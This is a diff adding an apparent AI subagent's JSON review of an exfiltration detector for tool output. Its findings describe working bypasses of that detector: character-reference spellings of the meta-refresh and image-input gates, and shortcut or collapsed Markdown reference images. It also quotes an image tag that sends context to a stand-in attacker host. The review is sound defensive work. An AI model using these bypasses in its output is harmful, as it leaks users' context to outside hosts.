@@ -1,0 +1,376 @@
+{
+  "contract_version": "1.0.0",
+  "run_id": "T66",
+  "dispatch_id": "233-T66-review-t46-auto-fetch-surface-coverage",
+  "status": "DONE_WITH_CONCERNS",
+  "summary": "Independent review of T46 (auto-fetch floor surface coverage). The 18-row widening is sound and correctly closed at all four boundaries, the deferred set is exactly what the documents claim, and all nine prior matrices plus the benign corpus reproduce their recorded outcomes. Two blockers: both gates T46 introduced (input type=image, meta http-equiv=refresh) compare the RAW attribute value while a renderer compares the decoded one, so 7 character-reference spellings of two DECLARED-COVERED surfaces reach a client with redaction.state=none at mcp/persist/transport/seam; and three CommonMark reference-image spellings (collapsed, shortcut, balanced-bracket description) that neither enumeration found are released, while the re-derivation and the edited requirements package assert that surface is completely covered. Ruling on the flagged judgement call: keep <iframe src> covered. The eager rows are acceptable but their disclosure understates the case-insensitive false-positive class. The normative edit was warranted but is inaccurate in both directions. A concurrent writer replaced exfil.ts and exfil.test.ts mid-review (T62#F-001 <base> suppression revert); every probe re-run after the drift is byte-identical, but T46's verification no longer describes the tree.",
+  "summary_markdown": null,
+  "acceptance": [
+    {
+      "criterion": "AC5 (AFC-15): no field-name or spelling bypass; a URL secret is masked; a public Markdown link is not treated as a network send",
+      "status": "not_met",
+      "evidence": "URL-secret masking and the public-link clause hold (egress.markdown-link-sensitive-value fires across the corpus; ctlPublicLink and fpPublicLink are state=none and byte-identical at all four boundaries; T66-rerun-T24-recheck2-boundary.log, T66-boundary.log). Spelling bypass FAILS on two counts: 7 character-reference gate spellings (T66-gates.log) and 3 CommonMark reference-image spellings (T66-md-oracle.log), all reaching mcp/persist/transport/seam with redaction.state=none (T66-boundary.log)."
+    },
+    {
+      "criterion": "Every covered surface is closed at the tool dispatch and the persistence materializer, not only at the detector",
+      "status": "partial",
+      "evidence": "All 18 newly covered element/attribute sites are flagged, fully masked and closed at dispatchCallTool, prepareOutputForPersistence, validateOutputForTransport and redactToolOutput (T66-enum.log, T66-boundary.log: hostileFullyClosed 17/17 driven rows, partial: []). Two of them are closed only for the undecoded spelling of their gate (T66#F-001)."
+    },
+    {
+      "criterion": "Every deferred surface's prerequisite is real and named",
+      "status": "met",
+      "evidence": "Independently re-derived and measured: link/script trip the file-shaped carriers an empty allowlist cannot excuse (boilerplateHtmlPage, ordinaryCssFile in T66-fp.log), CSS additionally needs a value grammar (@import bare-string and image-set() confirmed released in T66-enum.log), srcdoc needs nested recursion. Released set equals the deferred set exactly."
+    },
+    {
+      "criterion": "Every never-cover decision is justified by how a renderer actually behaves",
+      "status": "partial",
+      "evidence": "External SVG <use> (same-origin restricted) and the click/submit-gated elements are justified and correctly released (T66-enum.log). <frame src> rests on an untested tree-builder claim while the lol-html oracle attributes src to it exactly as to iframe (T66#F-006)."
+    },
+    {
+      "criterion": "The recorded limitation matches the implementation exactly, in both directions",
+      "status": "not_met",
+      "evidence": "The covered/deferred/never lists match FETCHING_ATTRIBUTES and HTML_START_TAG element-for-element, but the subsection claims a completeness the gated and markdown entries do not have, names <base href> as the only context exception when there are three, and omits case-insensitive matching so a reader underestimates coverage of quoted component markup (T66#F-003, evidence T66-gates.log and T66-fp.log)."
+    },
+    {
+      "criterion": "Nothing regressed: nine prior matrices and the benign corpus unchanged; canonicalization and persistence boundary rows untouched",
+      "status": "met",
+      "evidence": "All nine matrices re-run by me reproduce their recorded outcomes (T66-rerun-*.log); T42-boundary ROW 2 all ok/sameParse and ROW 3 signalMatrix are character-for-character equal to the values recorded in T42-review.md:261-264; T53-corpus re-run gives benign files with findings 15 with the same ids and Part B 6 flagged with the same 6 ids (T66-rerun-T53-corpus.log)."
+    },
+    {
+      "criterion": "The frozen acceptance criteria were not touched",
+      "status": "met",
+      "evidence": "acceptance-criteria.md sha256 fc255c571b594e18e5517e9105b5b049407b97c5db2d9d58a48f98689f4f21c9, mtime 2026-09-06 14:46:04, before T46's 21:10-21:31 window; only policies.md changed in the requirements package (mtime 21:26)."
+    },
+    {
+      "criterion": "Every verdict row cites an executed probe with a raw log path under .metaproject/data/gdctx/raw/",
+      "status": "met",
+      "evidence": "Five new probes (T66-enum.ts, T66-md-oracle.ts, T66-boundary.ts, T66-gates.ts, T66-fp.ts) plus eleven re-runs of prior matrices; 22 raw logs with SHA-256 listed in T66-review.md Evidence."
+    }
+  ],
+  "artifacts": [
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-review.md",
+      "kind": "review",
+      "exists": true,
+      "summary": "Stage 1 table, three judgement-call rulings, 10 findings, confirmed clean areas, evidence hashes, routing audit.",
+      "hash": null
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-enum.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Independent re-derivation of 58 rows / 51 fetching sites with an HTMLRewriter (lol-html) oracle; raw .metaproject/data/gdctx/raw/T66-enum.log.",
+      "hash": null
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-md-oracle.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "CommonMark reference-image spellings driven through `marked` as renderer oracle; raw .metaproject/data/gdctx/raw/T66-md-oracle.log.",
+      "hash": null
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-boundary.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "32 shapes through dispatchCallTool, prepareOutputForPersistence, validateOutputForTransport and redactToolOutput with advisory redaction off; raw .metaproject/data/gdctx/raw/T66-boundary.log.",
+      "hash": null
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-gates.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "23 gate spellings plus the scan-resume suppression widened by the new anchors; raw .metaproject/data/gdctx/raw/T66-gates.log.",
+      "hash": null
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-fp.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Nine realistic quoted documents testing the infrastructure-versus-content decision line; raw .metaproject/data/gdctx/raw/T66-fp.log.",
+      "hash": null
+    }
+  ],
+  "changed_files": [
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-review.md",
+      "change": "added (review report)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-result.json",
+      "change": "added (subagent result)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-enum.ts",
+      "change": "added (probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-md-oracle.ts",
+      "change": "added (probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-boundary.ts",
+      "change": "added (probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-gates.ts",
+      "change": "added (probe)"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-fp.ts",
+      "change": "added (probe)"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T66-*.log",
+      "change": "added (22 raw probe and re-run logs)"
+    }
+  ],
+  "findings": [
+    {
+      "id": "F-001",
+      "global_id": "T66#F-001",
+      "reviewer": "T66-independent-review-security-code+review-logic",
+      "severity": "blocker",
+      "file": "src/security/detect/exfil.ts",
+      "line": 520,
+      "symbol": "hasAttributeValue",
+      "problem": "Both gates T46 introduced (`<input>` requires type=image at :845, `<meta>` requires http-equiv=refresh at :848) compare the RAW attribute value. The HTML tokenizer consumes character references in attribute-value states, so http-equiv=\"&#114;efresh\" IS refresh and type=\"&#105;mage\" IS an image submit button. The module asserts that premise twice itself (renderableUrl, and metaRefreshDestination which decodes `content` for exactly this reason) and withholds it from the two gates.",
+      "impact": "7 measured spellings of two surfaces the requirements package declares covered reach a model client unmasked, including the NAV surface that navigates the whole client to the attacker. All 7 return isError:false with redaction.state=\"none\" and pass prepareOutputForPersistence, validateOutputForTransport and the seam byte-identical with attacker.invalid present. Spelling bypass of a covered surface (AC5) and a failure of 'every covered surface is closed at the tool dispatch and the persistence materializer'.",
+      "suggested_fix": "Compare the gate against decodeCharacterReferences(attribute.value) — the function already in this file — keeping trim().toLowerCase(); add the four type= and three http-equiv= spellings to the T46 gate tests beside the content=\"0&#59;…\" case that already exists.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-gates.ts -> gateBypasses: [inputTypeDecimalRef, inputTypeHexRef, inputTypeTrailingRef, inputTypeNoSemicolon, metaEquivDecimalRef, metaEquivHexRef, metaEquivTrailingRef]; raw .metaproject/data/gdctx/raw/T66-gates.log (sha256 278f74442b439049d53e5af4d41c6890eff2771e09314b8a4e677f72d186e993). Boundaries: T66-boundary.ts -> leakingWithStateNone includes bypMetaRefreshCharref, bypMetaRefreshHexCharref, bypInputTypeCharref, bypInputTypeTrailingCharref; raw .metaproject/data/gdctx/raw/T66-boundary.log (sha256 62a90cfed7f0cda434bc6b985073f4f7209d1ff6f3bb4d8fc235dd492247e76b).",
+      "confidence": "high",
+      "dedupe_key": "exfil-gate-raw-value-not-decoded",
+      "blocking_merge": true,
+      "related_skill": "review-security-code",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          "src/security/detect/exfil.ts:845 (input/type gate)",
+          "src/security/detect/exfil.ts:848 (meta/http-equiv gate)"
+        ],
+        "enumeration_method": "hasAttributeValue has exactly two call sites in the module, found by reading the whole file; every other branch keys off the attribute NAME position, which a tokenizer does not entity-decode, so the class is closed at two members."
+      }
+    },
+    {
+      "id": "F-002",
+      "global_id": "T66#F-002",
+      "reviewer": "T66-independent-review-security-code+review-logic",
+      "severity": "blocker",
+      "file": "src/security/detect/exfil.ts",
+      "line": 433,
+      "symbol": "REFERENCE_USE",
+      "problem": "REFERENCE_USE matches only the FULL CommonMark reference form ![alt][ref]; the collapsed form ![alt][] (empty second group) and the shortcut form ![alt] (no second bracket pair) match nothing, and INLINE's bracket class cannot span the balanced brackets CommonMark permits in a description, so ![a[b]c](URL) matches nothing either. All three render an auto-fetching <img>. T46 declared the enumeration re-derived from the standard, listed the markdown reference definition as covered, and wrote that completeness into the requirements package as 'перечень полный, не пример'.",
+      "impact": "The most ordinary markdown reference-image spelling — ![logo] with [logo]: URL at the bottom of a README — is a zero-click exfil channel the mandatory floor releases, reaching mcp/persist/transport/seam with redaction.state=\"none\". The detector gap predates T46; the false completeness claim in a normative document does not.",
+      "suggested_fix": "Make the second bracket group optional and empty-tolerant, resolving the label to the second group when non-empty and to the description otherwise (CommonMark's collapsed/shortcut rule), keeping the existing '!'-only gate so plain reference links stay click-gated; fix INLINE's description grammar separately; then correct T46-spec 2.1 and the policies.md covered list.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-md-oracle.ts — `marked` (independent CommonMark renderer, offline) emits <img src=\"https://attacker.invalid/p?ctx=CTX\"> for collapsedReference, shortcutReference, shortcutReferenceInProse, collapsedUppercaseRef and inlineNestedBrackets while detectExfil returns 0 findings for each; raw .metaproject/data/gdctx/raw/T66-md-oracle.log (sha256 896683fcf3ef2638322c7d6bf46d2878c0589f14ef104906483f8d7e8850dad9). Boundaries: T66-boundary.log rows bypCollapsedRefImage, bypShortcutRefImage, bypNestedBracketAlt leak at all four.",
+      "confidence": "high",
+      "dedupe_key": "exfil-markdown-collapsed-shortcut-reference-image-released",
+      "blocking_merge": true,
+      "related_skill": "review-security-code",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          "src/security/detect/exfil.ts:431 (INLINE description grammar)",
+          "src/security/detect/exfil.ts:433 (REFERENCE_USE label grammar)",
+          ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T46-spec.md:73 (row C2, 'already covered')",
+          "docs/requirements/keryx-agent-first-core/policies.md:28 (the covered list)"
+        ],
+        "enumeration_method": "Every CommonMark image spelling (inline, full reference, collapsed reference, shortcut reference, balanced-bracket description, uppercase label) driven through `marked` as renderer oracle and through detectExfil in T66-md-oracle.ts; the released ones are the class."
+      }
+    },
+    {
+      "id": "F-003",
+      "global_id": "T66#F-003",
+      "reviewer": "T66-independent-review-security-code+review-logic",
+      "severity": "major",
+      "file": "docs/requirements/keryx-agent-first-core/policies.md",
+      "line": 28,
+      "symbol": "Auto-fetch floor subsection",
+      "problem": "The new subsection is inaccurate in both directions. (a) It marks the covered list complete while <input type=image src>, <meta http-equiv=refresh> and the markdown reference definition are covered only for some spellings (T66#F-001, T66#F-002). (b) Line 34 says coverage ignores nesting and context with <base href> as the ONLY exception; markup inside another element's quoted attribute value is deliberately not flagged (T53#F-004) and an unterminated quoted value suppresses the rest of the fragment (T53#F-003). (c) It never states that element and attribute matching is ASCII case-insensitive, so a reader cannot learn that quoted component markup (<Video src>, <Iframe src> in a .tsx) is masked.",
+      "impact": "The acceptance criterion 'the recorded limitation matches the implementation exactly, in both directions' is not met. A requirements package that overstates completeness is worse than the silence it replaced, because the next round will trust it instead of re-deriving.",
+      "suggested_fix": "After F-001/F-002 are fixed, keep the completeness claim; until then qualify the two gated entries. Add the two context exceptions beside the <base> one, and one clause stating that element and attribute names are matched ASCII case-insensitively.",
+      "evidence": "Covered/deferred/never lists diffed against FETCHING_ATTRIBUTES (exfil.ts:484-513) and HTML_START_TAG (exfil.ts:452) — they match. (a) .metaproject/data/gdctx/raw/T66-gates.log; (b) exfil.ts:868-882 with T66-gates.ts Part B; (c) .metaproject/data/gdctx/raw/T66-fp.log row `reactMediaComponent side=covered-side findings=4` (sha256 07aca255cd77e2bea915255edf55b55883ccd08def158f533558a1a6f9e6a6af).",
+      "confidence": "high",
+      "dedupe_key": "policies-md-auto-fetch-subsection-inaccurate",
+      "blocking_merge": false,
+      "related_skill": "review-logic",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          "docs/requirements/keryx-agent-first-core/policies.md:28",
+          "docs/requirements/keryx-agent-first-core/policies.md:34",
+          "src/security/detect/exfil.ts:41-63 (module 'WHAT THIS FLOOR DOES NOT COVER' block, same two omissions)"
+        ],
+        "enumeration_method": "T46 section 7 records the limitation in exactly two places (module header and policies.md); both were read line by line against FETCHING_ATTRIBUTES, HTML_START_TAG, the HTML_START_TAG.lastIndex decision and readStartTag's unterminated-quote branch."
+      }
+    },
+    {
+      "id": "F-004",
+      "global_id": "T66#F-004",
+      "reviewer": "T66-independent-review-security-code+review-logic",
+      "severity": "minor",
+      "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T46-implementation.md",
+      "line": null,
+      "symbol": "section 4 row U16 / section 6.2",
+      "problem": "U16 is justified with 'benign incidence expected ~0 in modern source' and 'zero benign instances measured'. The background attribute is current practice in HTML email templates for Outlook, and such a template is a FILE-shaped carrier with no particular content — the property T46 used to defer script and link.",
+      "impact": "Bounded: the same template already carries <img src>, which the accepted baseline masks, so covering U16 still stands. What is wrong is the recorded reason, which the next round will read as evidence.",
+      "suggested_fix": "Replace the justification with the accurate one: the carrier exists (HTML email templates), it already trips the accepted <img src> baseline, and the allowlist is the remedy.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-fp.ts -> htmlEmailTemplate side=covered-side findings=5 {\"egress.html-image-exfil\":5}; raw .metaproject/data/gdctx/raw/T66-fp.log (sha256 07aca255cd77e2bea915255edf55b55883ccd08def158f533558a1a6f9e6a6af).",
+      "confidence": "high",
+      "dedupe_key": "u16-background-benign-incidence-claim-false",
+      "blocking_merge": false,
+      "related_skill": "review-logic",
+      "learning_candidate": false
+    },
+    {
+      "id": "F-005",
+      "global_id": "T66#F-005",
+      "reviewer": "T66-independent-review-security-code+review-logic",
+      "severity": "minor",
+      "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T46-implementation.md",
+      "line": null,
+      "symbol": "section 4 row U02 / section 3",
+      "problem": "'Masking it removes a navigation nobody wanted, so the mask has no cost of its own' is true of a rendered document and false of a quoted one. A generated documentation redirect stub is a file whose entire content is one <meta http-equiv=refresh>, and the whole directive is the mask span, so a reader of that file loses both the destination and the timeout.",
+      "impact": "Small and does not change the decision (the NAV blast radius dominates), but the cost weighing records a zero where there is not one.",
+      "suggested_fix": "Record the redirect-stub carrier in section 6 beside the <iframe> disclosure.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-fp.ts -> docsRedirectStub side=covered-side findings=1 {\"egress.html-meta-refresh-exfil\":1}; raw .metaproject/data/gdctx/raw/T66-fp.log.",
+      "confidence": "high",
+      "dedupe_key": "u02-meta-refresh-quoted-source-cost",
+      "blocking_merge": false,
+      "related_skill": "review-logic",
+      "learning_candidate": false
+    },
+    {
+      "id": "F-006",
+      "global_id": "T66#F-006",
+      "reviewer": "T66-independent-review-security-code+review-logic",
+      "severity": "minor",
+      "file": "src/security/detect/exfil.ts",
+      "line": 452,
+      "symbol": "HTML_START_TAG (frame deliberately absent)",
+      "problem": "U17 moved from 'cover now' to 'never cover' on the claim that a <frame> start tag is ignored in the 'in body' insertion mode. That is a tree-builder claim no oracle in this flow can test — lol-html attributes src to <frame> exactly as to <iframe> — and the spec's in-body rules do not name frame, so it falls to 'any other start tag'. The stated reason for choosing never over cover is aesthetic.",
+      "impact": "An asymmetric bet: if the claim holds, covering costs one table entry and zero measured false positives; if it fails in any renderer, the surface stays open and a regression test now pins it open.",
+      "suggested_fix": "Either add frame: { src: EMBEDDED_URL } to FETCHING_ATTRIBUTES and the element to HTML_START_TAG, or downgrade the recorded reason to 'not measured; excluded on the spec reading of the in-body insertion mode'.",
+      "evidence": ".metaproject/data/gdctx/raw/T66-enum.log row `U17.frameSrc cls=SUB t46=never oracle=true verdict=released` (sha256 4706e3613dfd7d3a267fc185ad479d93197ed9249566a183f683864639815209).",
+      "confidence": "medium",
+      "dedupe_key": "u17-frame-never-cover-unverified",
+      "blocking_merge": false,
+      "related_skill": "review-security-code",
+      "learning_candidate": false
+    },
+    {
+      "id": "F-007",
+      "global_id": "T66#F-007",
+      "reviewer": "T66-independent-review-security-code+review-logic",
+      "severity": "info",
+      "file": "src/security/detect/exfil.ts",
+      "line": 611,
+      "symbol": "readStartTag unterminated-quote branch with the widened HTML_START_TAG",
+      "problem": "An unterminated quoted value consumes to end of input and the scan resumes past it. Before T46 only <img>, <image> and <base> could trigger that; the 20-element set now includes <td>, <tr>, <table>, <body>, <meta> and <source>, which appear in essentially every quoted HTML file.",
+      "impact": "Not a bypass under the stated threat model — lol-html emits no element after the unterminated value on every row tested, matching the detector. Recorded because the blast radius of an inherited decision grew by an order of magnitude with no note in T46. The probe's markedRendersImg column is raw passthrough, not a fetch oracle.",
+      "suggested_fix": "Record the widened blast radius beside the T53#F-003 note in the module header.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-gates.ts Part B; raw .metaproject/data/gdctx/raw/T66-gates.log.",
+      "confidence": "high",
+      "dedupe_key": "widened-anchor-set-unterminated-quote-suppression",
+      "blocking_merge": false,
+      "related_skill": "review-security-code",
+      "learning_candidate": false
+    },
+    {
+      "id": "F-008",
+      "global_id": "T66#F-008",
+      "reviewer": "T66-independent-review-security-code+review-logic",
+      "severity": "info",
+      "file": "src/security/detect/exfil.ts",
+      "line": 520,
+      "symbol": "hasAttributeValue (duplicate resolution)",
+      "problem": "Duplicate attributes are resolved eagerly, so <input type=text type=image src=…> is flagged; a conformant tree builder keeps the FIRST duplicate, making it a text input that fetches nothing.",
+      "impact": "A masked URL in a shape no renderer requests. Contrived and disclosed in the code comment; recorded because that comment says the eager direction costs nothing and here it costs one false positive.",
+      "suggested_fix": "Either resolve the gate on the first occurrence, matching the tree builder, or amend the comment.",
+      "evidence": ".metaproject/data/gdctx/raw/T66-gates.log -> FALSE-POSITIVE inputDupTypeTextFirst.",
+      "confidence": "high",
+      "dedupe_key": "input-duplicate-type-eager-false-positive",
+      "blocking_merge": false,
+      "related_skill": "review-logic",
+      "learning_candidate": false
+    },
+    {
+      "id": "F-009",
+      "global_id": "T66#F-009",
+      "reviewer": "T66-independent-review-security-code+review-logic",
+      "severity": "info",
+      "file": "src/security/detect/exfil.test.ts",
+      "line": 983,
+      "symbol": "T46_CLASS_VECTORS",
+      "problem": "The persistence and transport regressions iterate 11 vectors; <audio src>, <source src>, <video src>, <feImage href>, <image xlink:href>, <td background> and track's non-default spelling are pinned only at the detector level.",
+      "impact": "None observed — 15 covered rows were driven through all four boundaries in this review and all are closed. A pinning gap, not a defect.",
+      "suggested_fix": "Extend T46_CLASS_VECTORS to one vector per policy id per element family.",
+      "evidence": ".metaproject/data/gdctx/raw/T66-boundary.log -> hostileFullyClosed: 17.",
+      "confidence": "high",
+      "dedupe_key": "t46-boundary-vectors-subset",
+      "blocking_merge": false,
+      "related_skill": "review-logic",
+      "learning_candidate": false
+    },
+    {
+      "id": "F-010",
+      "global_id": "T66#F-010",
+      "reviewer": "T66-independent-review-security-code+review-logic",
+      "severity": "major",
+      "file": "src/security/detect/exfil.ts",
+      "line": null,
+      "symbol": "whole file (concurrent write during review)",
+      "problem": "exfil.ts and exfil.test.ts were rewritten by a concurrent WRITER during this review (exfil.ts efe360a3… -> 63edcc57…, exfil.test.ts 6ec7871c… -> a8f2365b…). The edit removes the <base> inert-span machinery (nonRenderedSpans, fencedCodeBlockSpans, HTML_COMMENT_SPAN, isInNonRenderedSpan: 0 occurrences now) under the label 'T62#F-001 (suppression reverted)' — the behaviour the module header, T53#F-001 and T63 justify and T46 preserved. At 17:45Z the four required suites returned 93 pass / 4 fail; two minutes later the same command returned 97/0.",
+      "impact": "T46's sections 8.1/8.4/8.5 describe a tree that no longer exists and the module header documents a <base> behaviour the code no longer has. T46's surface work is unaffected — every T66 probe re-run after the drift is byte-identical — but the orchestrator cannot treat T46's verification as current, and two workers are writing the same file.",
+      "suggested_fix": "Serialize the writers, settle the T63-vs-T62 <base> inert-span question once, then re-run T46's nine matrices and the four focused suites against the settled tree.",
+      "evidence": "SHA-256 of the eight dispatch-named files at review start (21:39) and end (21:52), recorded in T66-review.md Scope; .metaproject/data/gdctx/raw/2026-09-06T17-45-01-455Z_run.log (93 pass / 4 fail, exit 1) versus 2026-09-06T17-32-14-893Z_run.log (96 pass / 0 fail); nonRenderedSpans occurrences in the current exfil.ts: 0.",
+      "confidence": "high",
+      "dedupe_key": "concurrent-write-drift-exfil-t62-revert",
+      "blocking_merge": false,
+      "related_skill": "flow-orchestrator",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          "src/security/detect/exfil.ts",
+          "src/security/detect/exfil.test.ts"
+        ],
+        "enumeration_method": "SHA-256 of every file the dispatch named, taken at review start and at review end; exactly these two differ, and the module was re-read to identify which symbols the concurrent edit removed."
+      }
+    }
+  ],
+  "questions": [
+    {
+      "id": "Q-001",
+      "question": "Should <iframe src> stay covered, given that a documentation page embedding a player is masked under the empty default allowlist?",
+      "why": "T46 isolated this row for pushback. This review rules KEEP COVERED (content, not infrastructure; img-equivalent blast radius; allowlist remedy verified working on this exact row), but the ruling is a product judgement the orchestrator may override with one line.",
+      "options": [
+        { "id": "keep", "label": "Keep <iframe src> covered (this review's recommendation)", "recommended": true },
+        { "id": "defer", "label": "Move it to the deferred set with the same allowlist prerequisite" }
+      ],
+      "can_be_resolved_by_agent": false
+    },
+    {
+      "id": "Q-002",
+      "question": "Which <base> behaviour is settled — T63's inert-span suppression that T46 preserved, or T62#F-001's revert that a concurrent writer applied mid-review?",
+      "why": "The two are mutually exclusive, both have regression tests, and the module header currently documents the suppression while the code no longer implements it. Until this is settled T46's verification cannot be re-confirmed.",
+      "options": [
+        { "id": "t63", "label": "Keep the inert-span suppression (T53#F-001 / T63)" },
+        { "id": "t62", "label": "Keep the revert (T62#F-001) and fix the module header" }
+      ],
+      "can_be_resolved_by_agent": false
+    }
+  ],
+  "errors": [],
+  "metrics": {
+    "duration_ms": null,
+    "prompt_tokens": null,
+    "output_tokens": null,
+    "retries": 0,
+    "probes_written": 5,
+    "probe_rows_executed": 174,
+    "prior_matrices_rerun": 10,
+    "raw_logs": 22,
+    "findings_by_severity": { "blocker": 2, "major": 2, "minor": 3, "info": 3 }
+  },
+  "timestamp_utc": "2026-09-06T17:55:00Z"
+}
